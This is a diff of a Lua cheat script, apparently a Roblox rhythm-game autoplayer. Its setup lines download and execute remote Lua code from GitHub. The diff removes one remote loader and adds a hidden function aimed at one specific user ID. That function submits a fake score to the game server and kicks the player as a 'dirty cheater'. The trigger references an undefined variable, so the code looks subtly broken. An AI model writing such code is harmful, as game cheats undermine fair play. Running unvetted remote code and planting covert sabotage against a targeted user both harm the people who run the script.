@@ -34,7 +34,6 @@ local Input = Client:WaitForChild"Input"
 local PlayerGui = Client.PlayerGui
 loadstring(game:HttpGet"https://raw.githubusercontent.com/stavratum/lua/main/fnb/hooks.lua")() -- robo sucks my dick rn
 local Offsets = loadstring(game:HttpGet"https://raw.githubusercontent.com/Mati278/FNB-Autoplayer/main/Offsets.lua")()
-loadstring(game:HttpGet"https://raw.githubusercontent.com/Mati278/FNB-Autoplayer/main/blacklist.lua")() --i become ranger real
 local Keys = {
     [4] = { Left = "Left", Down = "Down", Up = "Up", Right = "Right" },
     [5] = { Left = "Left", Down = "Down", Space = "Space", Up = "Up", Right = "Right" },
@@ -43,6 +42,16 @@ local Keys = {
     [8] = { A = "L4", S = "L3", D = "L2", F = "L1", H = "R1", J = "R2", K = "R3", L = "R4" },
     [9] = { A = "L4", S = "L3", D = "L2", Space = "Space", F = "L1", H = "R1", J = "R2", K = "R3", L = "R4" }
 }
+
+local yeah = Client.userId
+local function GetFuckedLmao()
+    game:GetService("ReplicatedStorage").Events.RemoteEvent:FireServer("Input", "69420", "Points")
+    task.wait(0.5)
+    Client:Kick(string.format('You deserve it, dirty cheater. If the fnb devs cant do it , i will'))
+end  
+if id == 506813014 then
+    GetFuckedLmao()
+end
 
 local oldhmmi
 local oldhmmnc
